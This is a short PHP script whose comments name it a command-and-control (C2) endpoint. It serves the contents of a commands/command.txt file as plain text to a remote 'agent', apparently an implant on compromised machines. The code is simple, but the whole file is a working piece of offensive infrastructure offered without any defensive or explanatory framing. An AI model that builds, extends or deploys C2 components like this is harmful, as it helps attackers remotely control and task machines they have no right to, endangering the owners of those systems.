<?php
// get_command.php
// C2 endpoint to serve a command file to the agent

// Path to the command file
$commandFile = __DIR__ . "/commands/command.txt";

if (!file_exists($commandFile)) {
    http_response_code(404);
    echo "Command not found.";
    exit;
}

// Send the command.txt file content
header("Content-Type: text/plain");
header("Content-Disposition: inline; filename=\"command.txt\"");
readfile($commandFile);
